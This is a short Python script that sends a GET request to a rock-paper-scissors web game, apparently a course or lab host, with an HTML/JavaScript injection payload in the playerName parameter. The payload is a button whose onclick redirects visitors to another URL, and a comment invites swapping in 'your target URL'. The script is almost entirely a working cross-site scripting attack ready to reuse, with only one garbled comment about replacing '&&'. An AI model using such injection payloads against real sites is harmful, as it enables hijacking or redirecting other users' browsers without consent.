import requests

# Encoded button tag with JavaScript
encoded_button_tag = "<button onclick=\"window.location.href = 'https://stone.sifs0005.infs.ch/91912126-58d8-4382-a77e-05621539c7f1';\">Click Me</button>"

# Replace && with && (already valid in Python)
encoded_button_tag = encoded_button_tag.replace("&amp;&amp;", "&&")

# Replace this URL with your target URL
url = f"https://stone.sifs0005.infs.ch/play?playerName={encoded_button_tag}&playerHand=Rock&mode=spock"
requests_count = 1

for i in range(requests_count):
    response = requests.get(url)
    print(f"Sent GET request {i + 1} to {url}")

print(f"Finished sending {requests_count} GET requests to {url}")
